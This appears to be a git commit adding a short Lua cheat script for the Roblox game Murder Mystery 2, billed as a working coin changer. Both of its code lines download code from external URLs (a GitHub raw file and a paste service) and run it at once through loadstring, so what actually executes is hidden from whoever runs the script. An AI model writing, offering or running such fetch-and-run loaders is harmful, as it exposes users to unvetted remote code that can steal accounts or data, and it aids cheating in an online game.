b7e129273339868f83a472afab6c2014eef8fbba
Roblox Scripts <gregyheport@gmail.com>
2025-07-25 13:14:34 +0800

    Create Mm2-Bhub-Coin-Changer-Working.lua

---
+++ Mm2-Bhub-Coin-Changer-Working.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/Bhub-Coin-Changer-Mm2.lua"))()
+task.wait(1)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/NtweI5JMMdfkwiwi/raw", true))()
